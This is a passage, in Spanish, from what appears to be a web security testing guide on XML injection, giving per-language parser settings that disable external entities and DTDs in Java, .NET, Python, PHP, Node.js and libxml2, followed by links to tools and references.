- **Java**: Configure `DocumentBuilderFactory`/`SAXParserFactory`/`XMLInputFactory`/`TransformerFactory` (y los analizadores basados en `Xerces`) para deshabilitar las declaraciones DOCTYPE, las entidades generales y de parámetro externas y XInclude.
- **.NET**: Use `XmlReaderSettings` con `DtdProcessing` establecido en `Prohibit` y `XmlResolver` establecido en `null` (o en un resolutor personalizado restrictivo).
- **Python**: Prefiera una biblioteca de análisis reforzada (por ejemplo, `defusedxml`) en lugar de usar directamente los módulos XML de la biblioteca estándar; para `lxml`, mantenga explícitamente `resolve_entities` en su valor predeterminado seguro (o establézcalo en `False`) y evite habilitar el acceso a la red en el analizador.
- **PHP**: En PHP 8.0 y versiones posteriores, `libxml_disable_entity_loader()` está obsoleto y en gran medida ya no es necesario. PHP ahora requiere libxml >= 2.9.0, que deshabilita la sustitución de entidades externas de forma predeterminada; por lo tanto, el análisis estándar basado en `DOMDocument`/`SimpleXML`/`libxml` en una versión actual de PHP no es vulnerable mediante la ruta clásica de entidades, a menos que el código vuelva a habilitarla explícitamente (por ejemplo, mediante `LIBXML_NOENT` junto con `LIBXML_DTDLOAD`). Por lo tanto, en versiones modernas de PHP, los probadores deberían buscar opciones que la vuelvan a habilitar explícitamente, en lugar de dar por hecho que el marco necesita una llamada para deshabilitarla; en PHP < 8.0 con versiones antiguas de libxml, la llamada para deshabilitarla sigue siendo necesaria. En cualquier caso, trate por separado las funciones de carga de archivos o conversión de documentos que llaman a bibliotecas de terceros, ya que estas pueden incluir su propio analizador, configurado de otra manera.
- **Node.js**: Para el análisis basado en `libxmljs`, nunca establezca `noent: true` en entradas no confiables; prefiera omitir la opción (o establecerla en `false`) y usarla junto con `nonet: true` para bloquear también la resolución de entidades mediante la red.
- **C/C++ (libxml2)**: Evite las opciones que habilitan la carga de entidades o el acceso a la red (por ejemplo, `XML_PARSE_NOENT`, `XML_PARSE_DTDLOAD`), a menos que sean explícitamente necesarias.

Para ver ejemplos de configuración específicos y autorizados por analizador, consulte la [Hoja de referencia para la prevención de entidades externas XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), que se mantiene por separado y se actualiza a medida que cambia el comportamiento de los analizadores.

## Herramientas

- [Cadenas de fuzzing para inyección XML (de la herramienta wfuzz)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
- [dtd-finder](https://github.com/GoSecure/dtd-finder) - una lista de rutas conocidas a archivos DTD locales y un escáner que puede enumerar las DTD presentes en un sistema de archivos o dentro de una imagen de contenedor/Docker, útil para la técnica de reutilización de DTD locales descrita anteriormente.

## Referencias

- [PortSwigger: inyección XML](https://portswigger.net/kb/issues/00100700_xml-injection)
- [Gregory Steuck, «Ataque XXE (entidad externa XML)»](https://seclists.org/bugtraq/2002/Oct/420)
- [Hoja de referencia para la prevención de XXE de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy: inyección de entidades externas XML (XXE)](https://portswigger.net/web-security/xxe)
- [PortSwigger Web Security Academy: XXE a ciegas](https://portswigger.net/web-security/xxe/blind)
- [HackTricks: XXE / XEE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)